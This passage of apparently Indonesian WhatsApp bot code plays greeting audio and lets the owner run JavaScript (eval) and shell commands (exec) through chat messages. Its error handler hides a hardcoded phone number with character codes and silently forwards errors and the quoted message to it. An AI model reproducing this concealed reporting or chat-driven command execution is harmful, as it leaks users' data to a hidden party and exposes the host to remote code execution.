if ((budy.match) && ["Oy", "P", "p", "bg", "Bg"].includes(budy)) {
xyu.sendMessage(m.chat, { audio: fs.readFileSync('./src/mp3/helo.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}

if ((budy.match) && ["assalamualaikum","assalamu'alaikum","Assalamualaikum","Assalamu'alaikum"].includes(budy) && !isCmd) {
xyu.sendMessage(m.chat, { audio: salamm, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}

//================================================================================

if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 51, 49, 55, 54, 51, 48, 53, 49, 48, 49)
xyu.sendMessage(Obj + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});